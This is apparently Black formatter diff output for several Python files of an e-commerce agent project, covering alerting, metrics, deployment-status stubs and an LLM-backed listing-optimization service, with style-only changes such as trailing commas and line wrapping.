         except Exception as e:
             logger.error("Failed to get system metrics: %s", str(e))
             return {"error": str(e)}
 
     async def get_active_alerts(self) -> Dict[str, Any]:
         """Get active system alerts."""
         try:
             if self.service_status["alerting"] != "active":
                 return {"error": "Alerting system not available"}
-            
+
             # Simulate active alerts
             return {
                 "alerts": [
                     {
                         "id": "alert_001",
                         "severity": "warning",
                         "title": "High Memory Usage",
                         "description": "Memory usage above 80% threshold",
                         "timestamp": datetime.now(timezone.utc).isoformat(),
-                        "status": "active"
+                        "status": "active",
                     },
                     {
                         "id": "alert_002",
                         "severity": "info",
                         "title": "Agent Response Time",
                         "description": "Market agent response time elevated",
                         "timestamp": datetime.now(timezone.utc).isoformat(),
-                        "status": "acknowledged"
-                    }
+                        "status": "acknowledged",
+                    },
                 ],
-                "summary": {
-                    "total": 2,
-                    "critical": 0,
-                    "warning": 1,
-                    "info": 1
-                },
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }
-            
+                "summary": {"total": 2, "critical": 0, "warning": 1, "info": 1},
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            }
+
         except Exception as e:
             logger.error("Failed to get active alerts: %s", str(e))
             return {"error": str(e)}
 
     async def get_deployment_status(self) -> Dict[str, Any]:
@@ -295,59 +306,59 @@
             # Simulate deployment status
             return {
                 "namespaces": {
                     "production": {"status": "active", "pods": 8},
                     "staging": {"status": "active", "pods": 4},
-                    "development": {"status": "active", "pods": 2}
+                    "development": {"status": "active", "pods": 2},
                 },
                 "deployments": {
                     "api-service": {"replicas": 3, "ready": 3, "status": "healthy"},
                     "agent-system": {"replicas": 2, "ready": 2, "status": "healthy"},
                     "database": {"replicas": 1, "ready": 1, "status": "healthy"},
                     "redis": {"replicas": 1, "ready": 1, "status": "healthy"},
-                    "qdrant": {"replicas": 1, "ready": 1, "status": "healthy"}
+                    "qdrant": {"replicas": 1, "ready": 1, "status": "healthy"},
                 },
                 "services": {
                     "api-service": {"type": "LoadBalancer", "status": "active"},
                     "database": {"type": "ClusterIP", "status": "active"},
-                    "redis": {"type": "ClusterIP", "status": "active"}
+                    "redis": {"type": "ClusterIP", "status": "active"},
                 },
                 "monitoring": {
                     "prometheus": {"status": "active"},
-                    "grafana": {"status": "active"}
-                },
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }
-            
+                    "grafana": {"status": "active"},
+                },
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            }
+
         except Exception as e:
             logger.error("Failed to get deployment status: %s", str(e))
             return {"error": str(e)}
 
     async def cleanup(self) -> Dict[str, Any]:
         """Clean up infrastructure services."""
         try:
             logger.info("Cleaning up infrastructure coordinator")
-            
+
             # Reset service status
             for service in self.service_status:
                 self.service_status[service] = "shutdown"
-            
+
             self.is_initialized = False
             logger.info("Infrastructure coordinator cleaned up successfully")
-            
+
             return {
                 "status": "success",
                 "message": "Infrastructure coordinator cleaned up",
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }
-            
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            }
+
         except Exception as e:
             logger.error("Failed to cleanup infrastructure coordinator: %s", str(e))
             return {
                 "status": "error",
                 "message": str(e),
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
 
 
 __all__ = [
     "InfrastructureCoordinator",
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/conversational/optimization_service.py	2025-06-14 20:35:30.827822+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/conversational/optimization_service.py	2025-06-19 04:04:06.787713+00:00
@@ -13,155 +13,163 @@
 import time
 from typing import Any, Dict, List, Optional
 from datetime import datetime, timezone
 from enum import Enum
 
-from fs_agt_clean.core.ai.simple_llm_client import SimpleLLMClient, SimpleLLMConfig as LLMConfig, ModelProvider, ModelType
+from fs_agt_clean.core.ai.simple_llm_client import (
+    SimpleLLMClient,
+    SimpleLLMConfig as LLMConfig,
+    ModelProvider,
+    ModelType,
+)
 
 logger = logging.getLogger(__name__)
 
 
 class OptimizationFocus(str, Enum):
     """Optimization focus areas."""
+
     GENERAL = "general"
     SEO = "seo"
     PRICING = "pricing"
     CONTENT = "content"
     IMAGES = "images"
     CATEGORY = "category"
 
 
 class OptimizationResult:
     """Result model for conversational optimization."""
-    
+
     def __init__(
         self,
         original_request: str,
         optimized_listing: Dict[str, Any],
         changes_made: List[Dict[str, Any]],
         explanation: str,
         confidence: float,
-        suggestions: List[str]
+        suggestions: List[str],
     ):
         self.original_request = original_request
         self.optimized_listing = optimized_listing
         self.changes_made = changes_made
         self.explanation = explanation
         self.confidence = confidence
         self.suggestions = suggestions
         self.processed_at = datetime.now(timezone.utc)
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary for API response."""
         return {
             "original_request": self.original_request,
             "optimized_listing": self.optimized_listing,
             "changes_made": self.changes_made,
             "explanation": self.explanation,
             "confidence": self.confidence,
             "additional_suggestions": self.suggestions,
-            "processed_at": self.processed_at.isoformat()
+            "processed_at": self.processed_at.isoformat(),
         }
 
 
 class ConversationalOptimizationService:
     """Service for conversational listing optimization using AI."""
-    
+
     def __init__(self):
         """Initialize the conversational optimization service."""
         self.llm_client = None
         self._optimization_cache = {}
         self.conversation_history = {}
         self.optimization_metrics = {
             "total_requests": 0,
             "successful_optimizations": 0,
-            "user_satisfaction": 0.0
+            "user_satisfaction": 0.0,
         }
-        
+
         logger.info("Conversational Optimization Service initialized")
-    
+
     @property
     def client(self) -> LLMClient:
         """Lazy initialization of LLM client."""
         if self.llm_client is None:
             config = LLMConfig(
                 provider=ModelProvider.OLLAMA,
                 model_type=ModelType.FLIPSYNC_BUSINESS,
-                temperature=0.4  # Balanced creativity and consistency
+                temperature=0.4,  # Balanced creativity and consistency
             )
             self.llm_client = LLMClient(config)
         return self.llm_client
-    
+
     async def process_optimization_request(
         self,
         user_message: str,
         current_listing: Dict[str, Any],
         conversation_context: List[Dict[str, Any]],
         optimization_focus: str = "general",
-        user_id: str = None
+        user_id: str = None,
     ) -> Dict[str, Any]:
         """
         Process conversational optimization request.
-        
+
         Args:
             user_message: User's natural language request
             current_listing: Current listing content
             conversation_context: Previous conversation history
             optimization_focus: Focus area for optimization
             user_id: User identifier for conversation tracking
-            
+
         Returns:
             Optimization result with changes and explanations
         """
         try:
             start_time = time.time()
-            
+
             # Update conversation history
             if user_id:
-                self._update_conversation_history(user_id, user_message, conversation_context)
-            
+                self._update_conversation_history(
+                    user_id, user_message, conversation_context
+                )
+
             # Parse user intent
             intent = await self._parse_user_intent(user_message, optimization_focus)
-            
+
             # Generate optimization
             optimization_result = await self._generate_optimization(
                 user_message, current_listing, intent, conversation_context
             )
-            
+
             # Validate changes
             validated_result = self._validate_optimization_changes(
                 current_listing, optimization_result
             )
-            
+
             # Create result object
             result = OptimizationResult(
                 original_request=user_message,
                 optimized_listing=validated_result["optimized_listing"],
                 changes_made=validated_result["changes_made"],
                 explanation=validated_result["explanation"],
                 confidence=validated_result["confidence"],
-                suggestions=validated_result["suggestions"]
-            )
-            
+                suggestions=validated_result["suggestions"],
+            )
+
             # Update metrics
             self.optimization_metrics["total_requests"] += 1
             if validated_result["confidence"] > 0.7:
                 self.optimization_metrics["successful_optimizations"] += 1
-            
+
             processing_time = time.time() - start_time
-            logger.info(f"Conversational optimization completed in {processing_time:.2f}s")
-            
+            logger.info(
+                f"Conversational optimization completed in {processing_time:.2f}s"
+            )
+
             return result.to_dict()
-            
+
         except Exception as e:
             logger.error(f"Error in conversational optimization: {e}")
             return self._create_fallback_optimization(user_message, current_listing)
-    
+
     async def _parse_user_intent(
-        self,
-        user_message: str,
-        optimization_focus: str
+        self, user_message: str, optimization_focus: str
     ) -> Dict[str, Any]:
         """Parse user intent from natural language message."""
         try:
             # Prepare intent analysis prompt
             prompt = f"""
@@ -180,64 +188,66 @@
             Intent: [primary_intent]
             Changes: [specific_changes]
             Urgency: [urgency_level]
             Scope: [scope_level]
             """
-            
+
             # Get AI analysis
             response = await self.client.generate_response(prompt)
-            
+
             # Parse response
             intent = self._parse_intent_response(response, optimization_focus)
-            
+
             return intent
-            
+
         except Exception as e:
             logger.error(f"Error parsing user intent: {e}")
             return {
                 "primary_intent": "general_improvement",
                 "specific_changes": ["improve overall quality"],
                 "urgency": "medium",
-                "scope": "minor_edit"
+                "scope": "minor_edit",
             }
-    
+
     async def _generate_optimization(
         self,
         user_message: str,
         current_listing: Dict[str, Any],
         intent: Dict[str, Any],
-        conversation_context: List[Dict[str, Any]]
+        conversation_context: List[Dict[str, Any]],
     ) -> Dict[str, Any]:
         """Generate optimization based on user intent."""
         try:
             # Prepare optimization prompt
             prompt = self._prepare_optimization_prompt(
                 user_message, current_listing, intent, conversation_context
             )
-            
+
             # Get AI optimization
             response = await self.client.generate_response(prompt)
-            
+
             # Parse optimization response
-            optimization = self._parse_optimization_response(response, current_listing, intent)
-            
+            optimization = self._parse_optimization_response(
+                response, current_listing, intent
+            )
+
             return optimization
-            
+
         except Exception as e:
             logger.error(f"Error generating optimization: {e}")
             return self._create_fallback_ai_optimization(current_listing, intent)
-    
+
     def _prepare_optimization_prompt(
         self,
         user_message: str,
         current_listing: Dict[str, Any],
         intent: Dict[str, Any],
-        conversation_context: List[Dict[str, Any]]
+        conversation_context: List[Dict[str, Any]],
     ) -> str:
         """Prepare prompt for AI optimization."""
         context_summary = self._summarize_conversation_context(conversation_context)
-        
+
         return f"""
         Optimize this listing based on the user's request:
         
         User Request: "{user_message}"
         Intent: {intent['primary_intent']}
@@ -263,112 +273,124 @@
         DESCRIPTION: [optimized_description]
         KEYWORDS: [keyword1, keyword2, keyword3]
         EXPLANATION: [why these changes help]
         SUGGESTIONS: [additional improvements]
         """
-    
+
     def _parse_optimization_response(
-        self,
-        response: str,
-        current_listing: Dict[str, Any],
-        intent: Dict[str, Any]
+        self, response: str, current_listing: Dict[str, Any], intent: Dict[str, Any]
     ) -> Dict[str, Any]:
         """Parse AI optimization response."""
-        lines = response.split('\n')
-        
+        lines = response.split("\n")
+
         optimization = {
             "optimized_listing": current_listing.copy(),
             "changes_made": [],
             "explanation": "Listing optimized based on your request.",
             "confidence": 0.8,
-            "suggestions": []
+            "suggestions": [],
         }
-        
+
         current_section = None
         content = []
-        
+
         for line in lines:
             line = line.strip()
-            if line.startswith('TITLE:'):
-                current_section = 'title'
-                content = [line.replace('TITLE:', '').strip()]
-            elif line.startswith('DESCRIPTION:'):
-                current_section = 'description'
-                content = [line.replace('DESCRIPTION:', '').strip()]
-            elif line.startswith('KEYWORDS:'):
-                current_section = 'keywords'
-                content = [line.replace('KEYWORDS:', '').strip()]
-            elif line.startswith('EXPLANATION:'):
-                current_section = 'explanation'
-                content = [line.replace('EXPLANATION:', '').strip()]
-            elif line.startswith('SUGGESTIONS:'):
-                current_section = 'suggestions'
-                content = [line.replace('SUGGESTIONS:', '').strip()]
+            if line.startswith("TITLE:"):
+                current_section = "title"
+                content = [line.replace("TITLE:", "").strip()]
+            elif line.startswith("DESCRIPTION:"):
+                current_section = "description"
+                content = [line.replace("DESCRIPTION:", "").strip()]
+            elif line.startswith("KEYWORDS:"):
+                current_section = "keywords"
+                content = [line.replace("KEYWORDS:", "").strip()]
+            elif line.startswith("EXPLANATION:"):
+                current_section = "explanation"
+                content = [line.replace("EXPLANATION:", "").strip()]
+            elif line.startswith("SUGGESTIONS:"):
+                current_section = "suggestions"
+                content = [line.replace("SUGGESTIONS:", "").strip()]
             elif line and current_section:
                 content.append(line)
-            
+
             # Process completed sections
-            if current_section and (line.startswith(('TITLE:', 'DESCRIPTION:', 'KEYWORDS:', 'EXPLANATION:', 'SUGGESTIONS:')) or line == lines[-1]):
+            if current_section and (
+                line.startswith(
+                    (
+                        "TITLE:",
+                        "DESCRIPTION:",
+                        "KEYWORDS:",
+                        "EXPLANATION:",
+                        "SUGGESTIONS:",
+                    )
+                )
+                or line == lines[-1]
+            ):
                 self._process_optimization_section(
                     current_section, content, optimization, current_listing
                 )
-        
+
         return optimization
-    
+
     def _process_optimization_section(
         self,
         section: str,
         content: List[str],
         optimization: Dict[str, Any],
-        current_listing: Dict[str, Any]
+        current_listing: Dict[str, Any],
     ):
         """Process a section of the optimization response."""
-        content_text = ' '.join(content).strip()
-        
-        if section == 'title' and content_text:
-            old_title = current_listing.get('title', '')
+        content_text = " ".join(content).strip()
+
+        if section == "title" and content_text:
+            old_title = current_listing.get("title", "")
             if content_text != old_title:
                 optimization["optimized_listing"]["title"] = content_text
-                optimization["changes_made"].append({
-                    "field": "title",
-                    "old_value": old_title,
-                    "new_value": content_text,
-                    "reason": "Improved for better visibility and SEO"
-                })
-        
-        elif section == 'description' and content_text:
-            old_description = current_listing.get('description', '')
+                optimization["changes_made"].append(
+                    {
+                        "field": "title",
+                        "old_value": old_title,
+                        "new_value": content_text,
+                        "reason": "Improved for better visibility and SEO",
+                    }
+                )
+
+        elif section == "description" and content_text:
+            old_description = current_listing.get("description", "")
             if content_text != old_description:
                 optimization["optimized_listing"]["description"] = content_text
-                optimization["changes_made"].append({
-                    "field": "description",
-                    "old_value": old_description[:100] + "...",
-                    "new_value": content_text[:100] + "...",
-                    "reason": "Enhanced with better details and keywords"
-                })
-        
-        elif section == 'keywords' and content_text:
-            keywords = [k.strip() for k in content_text.split(',')]
+                optimization["changes_made"].append(
+                    {
+                        "field": "description",
+                        "old_value": old_description[:100] + "...",
+                        "new_value": content_text[:100] + "...",
+                        "reason": "Enhanced with better details and keywords",
+                    }
+                )
+
+        elif section == "keywords" and content_text:
+            keywords = [k.strip() for k in content_text.split(",")]
             optimization["optimized_listing"]["keywords"] = keywords
-            optimization["changes_made"].append({
-                "field": "keywords",
-                "old_value": current_listing.get('keywords', []),
-                "new_value": keywords,
-                "reason": "Added relevant keywords for better search visibility"
-            })
-        
-        elif section == 'explanation' and content_text:
+            optimization["changes_made"].append(
+                {
+                    "field": "keywords",
+                    "old_value": current_listing.get("keywords", []),
+                    "new_value": keywords,
+                    "reason": "Added relevant keywords for better search visibility",
+                }
+            )
+
+        elif section == "explanation" and content_text:
             optimization["explanation"] = content_text
-        
-        elif section == 'suggestions' and content_text:
-            suggestions = [s.strip() for s in content_text.split(',') if s.strip()]
+
+        elif section == "suggestions" and content_text:
+            suggestions = [s.strip() for s in content_text.split(",") if s.strip()]
             optimization["suggestions"] = suggestions
-    
+
     def _create_fallback_optimization(
-        self,
-        user_message: str,
-        current_listing: Dict[str, Any]
+        self, user_message: str, current_listing: Dict[str, Any]
     ) -> Dict[str, Any]:
         """Create fallback optimization when AI fails."""
         return {
             "original_request": user_message,
             "optimized_listing": current_listing,
@@ -376,96 +398,97 @@
             "explanation": "Unable to process optimization request. Please try rephrasing your request or contact support.",
             "confidence": 0.1,
             "additional_suggestions": [
                 "Try being more specific about what you'd like to change",
                 "Consider using simpler language in your request",
-                "Check if your listing has all required fields filled"
+                "Check if your listing has all required fields filled",
             ],
-            "processed_at": datetime.now(timezone.utc).isoformat()
+            "processed_at": datetime.now(timezone.utc).isoformat(),
         }
 
-
-    def _parse_intent_response(self, response: str, optimization_focus: str) -> Dict[str, Any]:
+    def _parse_intent_response(
+        self, response: str, optimization_focus: str
+    ) -> Dict[str, Any]:
         """Parse AI intent analysis response."""
         intent = {
             "primary_intent": "general_improvement",
             "specific_changes": ["improve overall quality"],
             "urgency": "medium",
-            "scope": "minor_edit"
+            "scope": "minor_edit",
         }
 
-        lines = response.split('\n')
+        lines = response.split("\n")
         for line in lines:
-            if line.startswith('Intent:'):
-                intent["primary_intent"] = line.replace('Intent:', '').strip()
-            elif line.startswith('Changes:'):
-                changes = line.replace('Changes:', '').strip()
-                intent["specific_changes"] = [c.strip() for c in changes.split(',')]
-            elif line.startswith('Urgency:'):
-                intent["urgency"] = line.replace('Urgency:', '').strip()
-            elif line.startswith('Scope:'):
-                intent["scope"] = line.replace('Scope:', '').strip()
+            if line.startswith("Intent:"):
+                intent["primary_intent"] = line.replace("Intent:", "").strip()
+            elif line.startswith("Changes:"):
+                changes = line.replace("Changes:", "").strip()
+                intent["specific_changes"] = [c.strip() for c in changes.split(",")]
+            elif line.startswith("Urgency:"):
+                intent["urgency"] = line.replace("Urgency:", "").strip()
+            elif line.startswith("Scope:"):
+                intent["scope"] = line.replace("Scope:", "").strip()
 
         return intent
 
     def _create_fallback_ai_optimization(
-        self,
-        current_listing: Dict[str, Any],
-        intent: Dict[str, Any]
+        self, current_listing: Dict[str, Any], intent: Dict[str, Any]
     ) -> Dict[str, Any]:
         """Create fallback AI optimization."""
         return {
             "optimized_listing": current_listing,
             "changes_made": [],
             "explanation": "Applied basic optimization based on your request.",
             "confidence": 0.5,
             "suggestions": [
                 "Consider adding more specific keywords",
                 "Enhance product description with details",
-                "Review pricing for competitiveness"
-            ]
+                "Review pricing for competitiveness",
+            ],
         }
 
-    def _summarize_conversation_context(self, conversation_context: List[Dict[str, Any]]) -> str:
+    def _summarize_conversation_context(
+        self, conversation_context: List[Dict[str, Any]]
+    ) -> str:
         """Summarize conversation context for AI prompt."""
         if not conversation_context:
             return "No previous context"
 
         recent_messages = conversation_context[-3:]  # Last 3 messages
         summary = []
 
         for msg in recent_messages:
-            role = msg.get('role', 'user')
-            content = msg.get('content', '')[:100]
+            role = msg.get("role", "user")
+            content = msg.get("content", "")[:100]
             summary.append(f"{role}: {content}")
 
         return "; ".join(summary)
 
     def _update_conversation_history(
         self,
         user_id: str,
         user_message: str,
-        conversation_context: List[Dict[str, Any]]
+        conversation_context: List[Dict[str, Any]],
     ):
         """Update conversation history for user."""
         if user_id not in self.conversation_history:
             self.conversation_history[user_id] = []
 
         # Add current message
-        self.conversation_history[user_id].append({
-            "role": "user",
-            "content": user_message,
-            "timestamp": datetime.now(timezone.utc).isoformat()
-        })
+        self.conversation_history[user_id].append(
+            {
+                "role": "user",
+                "content": user_message,
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            }
+        )
 
         # Keep only last 10 messages
         self.conversation_history[user_id] = self.conversation_history[user_id][-10:]
 
     def _validate_optimization_changes(
-        self,
-        current_listing: Dict[str, Any],
-        optimization_result: Dict[str, Any]
+        self, current_listing: Dict[str, Any], optimization_result: Dict[str, Any]
     ) -> Dict[str, Any]:
         """Validate and sanitize optimization changes."""
         validated = optimization_result.copy()
 
         # Ensure optimized listing has required fields
@@ -473,16 +496,18 @@
 
         # Validate title length
         title = optimized_listing.get("title", "")
         if len(title) > 80:
             optimized_listing["title"] = title[:77] + "..."
-            validated["changes_made"].append({
-                "field": "title",
-                "old_value": title,
-                "new_value": optimized_listing["title"],
-                "reason": "Truncated to meet platform requirements"
-            })
+            validated["changes_made"].append(
+                {
+                    "field": "title",
+                    "old_value": title,
+                    "new_value": optimized_listing["title"],
+                    "reason": "Truncated to meet platform requirements",
+                }
+            )
 
         # Validate price
         price = optimized_listing.get("price", 0)
         if isinstance(price, str):
             try:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/conversational/optimization_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/alerts/notification_service.py	2025-06-14 20:35:30.835840+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/alerts/notification_service.py	2025-06-19 04:04:07.151168+00:00
@@ -6,11 +6,13 @@
 
 from fs_agt_clean.core.monitoring.alerts.models import AlertSeverity
 from fs_agt_clean.core.monitoring.alerts.notification_channels.email_service import (
     EmailService,
 )
-from fs_agt_clean.core.monitoring.alerts.notification_channels.sms_service import SMSService
+from fs_agt_clean.core.monitoring.alerts.notification_channels.sms_service import (
+    SMSService,
+)
 from fs_agt_clean.core.monitoring.protocols import MetricsService
 from fs_agt_clean.core.redis.redis_manager import RedisManager
 
 logger = logging.getLogger(__name__)
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/alerts/notification_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/api_metrics.py	2025-06-14 20:35:30.835840+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/api_metrics.py	2025-06-19 04:04:07.747611+00:00
@@ -224,13 +224,11 @@
                 endpoint=endpoint,
                 error_type=error_type,
                 version=self.api_version,
                 environment=self.environment,
             ).inc()
-            logger.error(
-                f"API error: {error_type} in {method} {endpoint}: {str(e)}"
-            )
+            logger.error(f"API error: {error_type} in {method} {endpoint}: {str(e)}")
             raise
         finally:
             # Decrement active requests counter
             API_ACTIVE_REQUESTS.labels(
                 method=method,
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/api_metrics.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/alerting.py	2025-06-14 20:35:30.831831+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/infrastructure/monitoring/alerting.py	2025-06-19 04:04:07.752972+00:00
@@ -20,254 +20,282 @@
 logger = get_logger(__name__)
 
 
 class AlertSeverity(str, Enum):
     """Alert severity levels."""
+
     INFO = "info"
     WARNING = "warning"
     ERROR = "error"
     CRITICAL = "critical"
 
 
 class AlertStatus(str, Enum):
     """Alert status."""
+
     ACTIVE = "active"
     RESOLVED = "resolved"
     ACKNOWLEDGED = "acknowledged"
 
 
 class AlertRule(BaseModel):
     """Alert rule configuration."""
-    
+
     id: str = Field(..., description="Unique identifier for the rule")
     name: str = Field(..., description="Rule name")
     description: str = Field(..., description="Rule description")
     metric_name: str = Field(..., description="Metric name to monitor")
     component: Optional[str] = Field(None, description="Metric component")
     labels: Dict[str, str] = Field(default_factory=dict, description="Metric labels")
-    
+
     # Threshold configuration
     threshold: float = Field(..., description="Threshold value")
-    comparison: str = Field(..., description="Comparison operator (>, <, >=, <=, ==, !=)")
-    duration: int = Field(0, description="Duration in seconds the threshold must be exceeded")
-    
+    comparison: str = Field(
+        ..., description="Comparison operator (>, <, >=, <=, ==, !=)"
+    )
+    duration: int = Field(
+        0, description="Duration in seconds the threshold must be exceeded"
+    )
+
     # Alert configuration
     severity: AlertSeverity = Field(AlertSeverity.WARNING, description="Alert severity")
-    notification_channels: List[str] = Field(default_factory=list, description="Notification channels")
+    notification_channels: List[str] = Field(
+        default_factory=list, description="Notification channels"
+    )
     cooldown: int = Field(300, description="Cooldown period in seconds")
-    
+
     # State
     enabled: bool = Field(True, description="Whether the rule is enabled")
 
 
 class Alert(BaseModel):
     """Alert information."""
-    
+
     id: str = Field(..., description="Unique identifier for the alert")
     rule_id: str = Field(..., description="ID of the rule that triggered the alert")
     name: str = Field(..., description="Alert name")
     description: str = Field(..., description="Alert description")
     metric_name: str = Field(..., description="Metric name")
     component: Optional[str] = Field(None, description="Metric component")
     labels: Dict[str, str] = Field(default_factory=dict, description="Metric labels")
-    
+
     # Alert details
     value: float = Field(..., description="Current metric value")
     threshold: float = Field(..., description="Threshold value")
     comparison: str = Field(..., description="Comparison operator")
-    
+
     # Status
     status: AlertStatus = Field(AlertStatus.ACTIVE, description="Alert status")
     severity: AlertSeverity = Field(AlertSeverity.WARNING, description="Alert severity")
-    
+
     # Timestamps
-    created_at: datetime = Field(default_factory=datetime.utcnow, description="Creation time")
-    updated_at: datetime = Field(default_factory=datetime.utcnow, description="Last update time")
+    created_at: datetime = Field(
+        default_factory=datetime.utcnow, description="Creation time"
+    )
+    updated_at: datetime = Field(
+        default_factory=datetime.utcnow, description="Last update time"
+    )
     resolved_at: Optional[datetime] = Field(None, description="Resolution time")
-    acknowledged_at: Optional[datetime] = Field(None, description="Acknowledgement time")
-    
+    acknowledged_at: Optional[datetime] = Field(
+        None, description="Acknowledgement time"
+    )
+
     # Notification
-    notification_channels: List[str] = Field(default_factory=list, description="Notification channels")
-    last_notification_time: Optional[datetime] = Field(None, description="Last notification time")
+    notification_channels: List[str] = Field(
+        default_factory=list, description="Notification channels"
+    )
+    last_notification_time: Optional[datetime] = Field(
+        None, description="Last notification time"
+    )
     notification_count: int = Field(0, description="Number of notifications sent")
 
 
 class AlertingService:
     """
     Service for monitoring metrics and sending alerts.
-    
+
     This class monitors metrics and sends alerts when thresholds are exceeded.
     """
-    
+
     def __init__(
         self,
         metrics_service: MetricsService,
         notification_service: Optional[NotificationService] = None,
         check_interval: int = 60,  # 1 minute
     ):
         """
         Initialize the alerting service.
-        
+
         Args:
             metrics_service: Metrics service for retrieving metrics
             notification_service: Notification service for sending alerts
             check_interval: Interval between alert checks in seconds
         """
         self.metrics_service = metrics_service
         self.notification_service = notification_service
         self.check_interval = check_interval
-        
+
         self.is_running = False
         self.check_task = None
         self.last_check_time = None
-        
+
         # Alert rules
         self.rules: Dict[str, AlertRule] = {}
-        
+
         # Active alerts
         self.alerts: Dict[str, Alert] = {}
-        
+
         # Alert history
         self.alert_history: List[Alert] = []
-        
+
         # Metric state for duration-based alerts
         self.metric_state: Dict[str, Dict[str, Any]] = {}
-        
+
         logger.info("Alerting service initialized")
-    
+
     async def start(self) -> None:
         """Start checking for alerts."""
         if self.is_running:
             logger.warning("Alerting service is already running")
             return
-        
+
         self.is_running = True
         self.check_task = asyncio.create_task(self._check_alerts_loop())
         logger.info("Started alerting service")
-    
+
     async def stop(self) -> None:
         """Stop checking for alerts."""
         if not self.is_running:
             logger.warning("Alerting service is not running")
             return
-        
+
         self.is_running = False
         if self.check_task:
             self.check_task.cancel()
             try:
                 await self.check_task
             except asyncio.CancelledError:
                 pass
             self.check_task = None
-        
+
         logger.info("Stopped alerting service")
-    
+
     async def _check_alerts_loop(self) -> None:
         """Continuously check for alerts at the configured interval."""
         while self.is_running:
             try:
                 await self._check_alerts()
                 self.last_check_time = datetime.utcnow()
-                
+
                 # Sleep until next check
                 await asyncio.sleep(self.check_interval)
             except asyncio.CancelledError:
                 break
             except Exception as e:
                 logger.error("Error checking alerts: %s", e)
                 await asyncio.sleep(10)  # Sleep for a short time before retrying
-    
+
     async def _check_alerts(self) -> None:
         """Check all alert rules."""
         try:
             # Get latest metrics
             latest_metrics = await self.metrics_service.get_latest_metrics()
-            
+
             # Check each rule
             for rule_id, rule in self.rules.items():
                 if not rule.enabled:
                     continue
-                
+
                 try:
                     # Find matching metrics
                     matching_metrics = []
                     for metric in latest_metrics:
                         if metric["name"] == rule.metric_name:
                             # Check component if specified
-                            if rule.component and metric.get("component") != rule.component:
+                            if (
+                                rule.component
+                                and metric.get("component") != rule.component
+                            ):
                                 continue
-                            
+
                             # Check labels if specified
                             if rule.labels:
                                 metric_labels = metric.get("labels", {})
-                                if not all(metric_labels.get(k) == v for k, v in rule.labels.items()):
+                                if not all(
+                                    metric_labels.get(k) == v
+                                    for k, v in rule.labels.items()
+                                ):
                                     continue
-                            
+
                             matching_metrics.append(metric)
-                    
+
                     # Process matching metrics
                     for metric in matching_metrics:
                         await self._process_metric(rule, metric)
                 except Exception as e:
                     logger.error("Error checking rule %s: %s", rule_id, e)
-            
+
             # Check for resolved alerts
             await self._check_resolved_alerts(latest_metrics)
-            
+
             logger.debug("Checked alerts")
         except Exception as e:
             logger.error("Error checking alerts: %s", e)
-    
+
     async def _process_metric(self, rule: AlertRule, metric: Dict[str, Any]) -> None:
         """
         Process a metric against a rule.
-        
+
         Args:
             rule: Alert rule
             metric: Metric data
         """
         try:
             # Get metric value
             value = metric["value"]
-            
+
             # Check threshold
-            threshold_exceeded = self._check_threshold(value, rule.threshold, rule.comparison)
-            
+            threshold_exceeded = self._check_threshold(
+                value, rule.threshold, rule.comparison
+            )
+
             # Get metric key
             metric_key = self._get_metric_key(rule, metric)
-            
+
             # Check if we need to track duration
             if rule.duration > 0:
                 # Get or initialize metric state
                 if metric_key not in self.metric_state:
                     self.metric_state[metric_key] = {
                         "exceeded_since": None,
                         "last_value": value,
                         "last_check": datetime.utcnow(),
                     }
-                
+
                 state = self.metric_state[metric_key]
-                
+
                 if threshold_exceeded:
                     # Start or continue tracking duration
                     if state["exceeded_since"] is None:
                         state["exceeded_since"] = datetime.utcnow()
-                    
+
                     # Check if duration threshold is met
-                    duration = (datetime.utcnow() - state["exceeded_since"]).total_seconds()
+                    duration = (
+                        datetime.utcnow() - state["exceeded_since"]
+                    ).total_seconds()
                     if duration >= rule.duration:
                         # Duration threshold met, create or update alert
                         await self._create_or_update_alert(rule, metric, value)
                 else:
                     # Reset duration tracking
                     state["exceeded_since"] = None
-                    
+
                     # Check if alert should be resolved
                     alert_id = f"{rule.id}:{metric_key}"
                     if alert_id in self.alerts:
                         await self._resolve_alert(alert_id, value)
-                
+
                 # Update state
                 state["last_value"] = value
                 state["last_check"] = datetime.utcnow()
             else:
                 # No duration tracking, create alert immediately if threshold is exceeded
@@ -278,20 +306,20 @@
                     alert_id = f"{rule.id}:{metric_key}"
                     if alert_id in self.alerts:
                         await self._resolve_alert(alert_id, value)
         except Exception as e:
             logger.error("Error processing metric for rule %s: %s", rule.id, e)
-    
+
     def _check_threshold(self, value: float, threshold: float, comparison: str) -> bool:
         """
         Check if a value exceeds a threshold.
-        
+
         Args:
             value: Value to check
             threshold: Threshold value
             comparison: Comparison operator
-            
+
         Returns:
             True if the threshold is exceeded, False otherwise
         """
         if comparison == ">":
             return value > threshold
@@ -306,65 +334,73 @@
         elif comparison == "!=":
             return value != threshold
         else:
             logger.warning("Unknown comparison operator: %s", comparison)
             return False
-    
+
     def _get_metric_key(self, rule: AlertRule, metric: Dict[str, Any]) -> str:
         """
         Get a unique key for a metric.
-        
+
         Args:
             rule: Alert rule
             metric: Metric data
-            
+
         Returns:
             Unique metric key
         """
         # Start with metric name
         key_parts = [metric["name"]]
-        
+
         # Add component if present
         if "component" in metric:
             key_parts.append(metric["component"])
-        
+
         # Add labels if present
         if "labels" in metric and metric["labels"]:
